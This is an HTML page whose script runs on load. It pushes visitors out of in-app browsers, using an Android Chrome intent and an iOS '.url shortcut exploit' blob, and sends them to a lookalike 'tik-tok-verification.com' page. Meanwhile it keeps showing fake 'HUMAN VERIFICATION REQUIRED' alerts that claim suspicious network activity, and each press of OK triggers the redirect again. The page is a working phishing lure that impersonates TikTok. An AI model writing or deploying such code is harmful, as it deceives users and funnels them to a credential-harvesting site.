<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body { background: #fff; margin: 0; padding: 0; }</style>
</head>
<body>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 5000;

    function theBinaryEject() {
        const isAndroid = /Android/i.test(navigator.userAgent);

        if (isAndroid) {
            // Android: Package-specific Intent
            const clean = targetUrl.replace(/^https?:\/\//, '');
            window.location.href = `intent://${clean}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
        } else {
            // iOS: THE .URL SHORTCUT EXPLOIT
            // We create a Windows-style shortcut file in the browser memory.
            // When iOS 'opens' this, it MUST use Safari.
            const urlShortcut = "[InternetShortcut]\nURL=" + targetUrl;
            const blob = new Blob([urlShortcut], {type: 'application/x-mswinurl'});
            const blobUrl = URL.createObjectURL(blob);

            // 1. Force the 'Download/Open' handoff
            window.location.href = blobUrl;

            // 2. Pulse the direct protocol as a backup
            setTimeout(() => {
                const domain = targetUrl.replace(/^https?:\/\//, '');
                window.location.href = "googlechromes://" + domain;
            }, 100);
        }
    }

    function runSystem() {
        if (Date.now() > killTime) return;

        // Try to break out before the alert
        theBinaryEject();

        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "HUMAN VERIFICATION REQUIRED\n";
                const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                
                alert(header + body);

                // Fire on "OK" (User Gesture)
                theBinaryEject();

                setTimeout(runSystem, 300);
            }
        }, 300);
    }

    window.onload = runSystem;
</script>

</body>
</html>
